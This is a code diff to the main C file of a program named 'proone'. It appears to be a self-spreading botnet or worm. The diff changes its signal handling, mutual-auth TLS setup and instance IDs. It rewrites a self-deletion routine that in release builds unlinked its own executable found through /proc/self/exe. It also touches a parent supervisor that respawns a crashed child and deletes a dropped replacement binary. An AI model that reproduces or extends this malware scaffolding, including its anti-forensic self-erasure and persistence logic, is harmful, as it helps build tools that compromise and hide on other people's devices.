@@ -138,14 +138,10 @@ static void seed_ssl_rnd (const bool use_bent) {
 */
 static int proone_main (void) {
 	static int caught_sig;
-	static pid_t reaped;
 
 	prne_assert(pth_init());
 	prne_g.main_pth = pth_self();
 
-#ifndef PRNE_DEBUG
-	signal(SIGPIPE, SIG_IGN);
-#endif
 	seed_ssl_rnd(true);
 	alloc_workers();
 
@@ -156,14 +152,10 @@ static int proone_main (void) {
 
 	do {
 		prne_assert(pth_sigwait(&ss_all, &caught_sig) == 0);
-		if (caught_sig == SIGCHLD) {
-			do {
-				reaped = waitpid(-1, NULL, WNOHANG);
-			} while (reaped > 0);
-			continue;
-		}
-		else if (caught_sig == SIGINT) {
-			// Probably Ctrl + C. Wait for the parent to send SIGTERM.
+		switch (caught_sig) {
+		case SIGCHLD: // Not my child
+		case SIGINT: // Probably Ctrl + C. Wait for the parent to send SIGTERM.
+		case SIGPIPE:
 			continue;
 		}
 	} while (false);
@@ -185,24 +177,8 @@ static int proone_main (void) {
 }
 
 static void delete_myself (const char *arg0) {
-#ifndef PRNE_DEBUG
-	static const char *proc_path = "/proc/self/exe";
-	struct stat st;
-	const char *path_to_unlink = NULL;
-	char *path_buf = NULL;
-
-	// get real path of myself
-	if (lstat(proc_path, &st) == 0 && (path_buf = (char*)prne_malloc(1, st.st_size + 1)) != NULL && readlink(proc_path, path_buf, st.st_size) == st.st_size) {
-		path_buf[st.st_size] = 0;
-		path_to_unlink = path_buf;
-	}
-	else {
-		// try to delete arg0 instead
-		path_to_unlink = arg0;
-	}
-
-	unlink(path_to_unlink);
-	prne_free(path_buf);
+#if defined(PRNE_DEBUG)
+	unlink(arg0);
 #endif
 }
 
@@ -400,6 +376,10 @@ static void load_ssl_conf (void) {
 	// set mutual auth
 	// ignore expired cert (system wall clock might not be set)
 	if (prne_g.s_ssl.ready) {
+		mbedtls_ssl_conf_rng(
+			&prne_g.s_ssl.conf,
+			mbedtls_ctr_drbg_random,
+			&prne_g.ssl.rnd);
 		mbedtls_ssl_conf_ca_chain(
 			&prne_g.s_ssl.conf,
 			&prne_g.ssl.ca, NULL);
@@ -412,6 +392,10 @@ static void load_ssl_conf (void) {
 			NULL);
 	}
 	if (prne_g.c_ssl.ready) {
+		mbedtls_ssl_conf_rng(
+			&prne_g.c_ssl.conf,
+			mbedtls_ctr_drbg_random,
+			&prne_g.ssl.rnd);
 		mbedtls_ssl_conf_ca_chain(
 			&prne_g.c_ssl.conf,
 			&prne_g.ssl.ca,
@@ -491,7 +475,7 @@ static bool init_shared_global (void) {
 				goto END;
 			}
 
-			memzero(&skel, sizeof(skel));
+			prne_memzero(&skel, sizeof(skel));
 			// Future code for new shared_global format goes here
 			skel.rev = 0;
 
@@ -516,7 +500,7 @@ static bool init_shared_global (void) {
 		prne_dbgperr("* Failed to initialise shared global");
 	}
 	else {
-		prne_s_g->ny_bin_name[0] = 0;
+		prne_s_g->ny_bin_path[0] = 0;
 	}
 
 END:
@@ -540,10 +524,10 @@ static void init_ids (void) {
 	int fd = -1;
 
 	if (mbedtls_ctr_drbg_random(&prne_g.ssl.rnd, prne_g.instance_id, sizeof(prne_g.instance_id)) != 0) {
-		memzero(prne_g.instance_id, sizeof(prne_g.instance_id));
+		prne_memzero(prne_g.instance_id, sizeof(prne_g.instance_id));
 	}
 
-	memzero(prne_g.boot_id, 16);
+	prne_memzero(prne_g.boot_id, 16);
 	do { // fake loop
 		fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY);
 		if (fd < 0) {
@@ -601,6 +585,7 @@ int main (const int argc, const char **args) {
 	sigaddset(&ss_all, SIGINT);
 	sigaddset(&ss_all, SIGTERM);
 	sigaddset(&ss_all, SIGCHLD);
+	sigaddset(&ss_all, SIGPIPE);
 
 	prne_g.parent_start = prne_gettime(CLOCK_MONOTONIC);
 	prne_g.resolv = NULL;
@@ -626,8 +611,8 @@ int main (const int argc, const char **args) {
 	init_proone(args[0]);
 
 	/* inits that need outside resources. IN THIS ORDER! */
-	load_ssl_conf();
 	seed_ssl_rnd(false);
+	load_ssl_conf();
 	init_ids();
 	if (!init_shared_global()) {
 		prne_dbgpf("*** Another instance detected.\n");
@@ -678,10 +663,13 @@ int main (const int argc, const char **args) {
 				case SIGCHLD:
 					prne_assert(waitpid(prne_g.child_pid, &status, WNOHANG) == prne_g.child_pid);
 					break;
+				case SIGPIPE:
+					prne_dbgpf("** Parent received SIGPIPE. WHAT???\n");
+					continue;
 				}
 			} while (false);
 
-			has_ny_bin = strlen(prne_s_g->ny_bin_name) > 0;
+			has_ny_bin = strlen(prne_s_g->ny_bin_path) > 0;
 
 			if (!(WIFEXITED(status) && WEXITSTATUS(status) == 0)) {
 				prne_s_g->crash_cnt += 1;
@@ -704,8 +692,8 @@ int main (const int argc, const char **args) {
 			}
 
 			if (has_ny_bin) {
-				unlink(prne_s_g->ny_bin_name);
-				prne_s_g->ny_bin_name[0] = 0;
+				unlink(prne_s_g->ny_bin_path);
+				prne_memzero(prne_s_g->ny_bin_path, sizeof(prne_s_g->ny_bin_path));
 			}
 
 			sleep(1);
